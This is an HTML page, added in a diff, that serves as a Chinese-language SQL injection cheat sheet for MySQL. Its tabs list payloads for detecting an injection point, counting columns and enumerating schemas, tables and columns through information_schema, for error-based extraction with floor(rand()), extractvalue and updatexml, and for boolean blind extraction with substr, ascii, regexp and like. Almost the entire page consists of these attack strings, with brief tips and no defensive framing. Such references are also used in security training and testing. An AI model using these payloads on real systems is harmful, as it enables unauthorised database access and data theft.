@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>开始使用 layui</title>
+  <link rel="stylesheet" href="./layui/css/layui.css">
+</head>
+
+<body>
+
+  <div class="layui-container">
+
+    <div class="layui-row">
+      <div class="layui-col-md12" style="width: 600px;">
+        <div class="layui-tab layui-tab-brief" lay-filter="docDemoTabBrief">
+          <ul class="layui-tab-title">
+            <li class="layui-this">MySQL基础查询语句</li>
+            <li>报错注入</li>
+            <li>布尔盲注</li>
+            <!-- <li>时间盲注</li> -->
+          </ul>
+          <div class="layui-tab-content">
+            <div class="layui-tab-item layui-show">
+
+              <!-- SQL基础语句 -->
+              <ul class="layui-timeline">
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">手工简单注入识别</h3>
+                    <pre class="layui-code layui-font-16">'<br>and 1=1      /  and 1=2<br>and '1'='1   /  and '1'='2<br>and 1 like 1 /  and 1 like 2</pre>
+
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">判断有几列</h3>
+                    <pre class="layui-code layui-font-16">order by 数字 #</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 当判断数字大于列数会报错
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">查库</h3>
+                    <pre class="layui-code layui-font-16">select schema_name from information_schema.schemata</pre>
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">查库</h3>
+                    <pre class="layui-code layui-font-16">select schema_name from information_schema.schemata</pre>
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">查表</h3>
+                    <pre
+                      class="layui-code layui-font-16">select table_name from information_schema.tables where table_schema='库名'</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 库名=database()
+
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">查列</h3>
+                    <pre
+                      class="layui-code layui-font-16">select column_name from information_schema.columns where table_name = '表名'</pre>
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">查数据</h3>
+                    <pre class="layui-code layui-font-16">select 列名 from 库名.表名</pre>
+                    <p><i class="layui-icon layui-icon-tips"></i> 数据过多可以使用group_concat()连接成一条语句</p>
+                  </div>
+                </li>
+
+
+              </ul>
+              <!-- SQL基础语句 -->
+
+            </div>
+            <div class="layui-tab-item">
+
+              <!-- 报错 -->
+              <ul class="layui-timeline">
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">floor()</h3>
+                    <pre
+                      class="layui-code layui-font-16">select count(*) from information_schema.tables group by concat((SQL注入语句),floor(rand(0)*2))</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 提示数据超过一行，利用limit语句逐个查询数据
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">extractvalue()</h3>
+                    <pre class="layui-code layui-font-16">select extractvalue(1,concat(0x7e,(SQL注入语句),0x7e))</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 0x7e = ~
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">updatexml()</h3>
+                    <pre class="layui-code layui-font-16">select updatexml(1,concat(0x7e,(),0x7e),1)</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 报错信息只有32位或者显示不全，可以使用substr()逐个读取数据
+                  </div>
+                </li>
+              </ul>
+              <!-- 报错 -->
+
+            </div>
+            <div class="layui-tab-item">
+
+              <!-- 盲注 -->
+              <ul class="layui-timeline">
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">left()</h3>
+
+                    <pre class="layui-code layui-font-16">left(database(),1)>'s'</pre>
+                    <i class="layui-icon layui-icon-tips"></i> database()显示数据库名称，left(a,b)从左侧截取a的前b位
+
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">regexp</h3>
+                    <pre class="layui-code layui-font-16">select user() regexp '^r'</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">like</h3>
+                    <pre class="layui-code layui-font-16">select user() like 'ro%'</pre>
+                    <i class="layui-icon layui-icon-tips"></i> 与regexp类似，使用like进行匹配
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">ascii()&substr()</h3>
+                    <pre class="layui-code layui-font-16">ascii(substr((database()),1,1))=115</pre>
+                    <i class="layui-icon layui-icon-tips"></i> substr(a,b,c)从b位置开始，截取字符串a的c长度 ascii()将某个字符转换为ASCII值
+                  </div>
+                </li>
+                <li class="layui-timeline-item">
+                  <i class="layui-icon layui-timeline-axis">&#xe63f;</i>
+                  <div class="layui-timeline-content layui-text">
+                    <h3 class="layui-timeline-title">ord()&mid()</h3>
+                    <pre class="layui-code layui-font-16">ord(mid((database()),1,1))=115</pre>
+                    <i class="layui-icon layui-icon-tips"></i> mid(a,b,c)从b位置开始，截取字符串a的c长度 ord()函数同ascii(),将字符转为ASCII值
+
+                  </div>
+                </li>
+              </ul>
+
+              <!-- 盲注 -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+
+<script src="./layui/layui.js"></script>
+<script>
+  layui.code({
+
+    with: '100%'
+
+
+  });
+</script>
+
+</html>
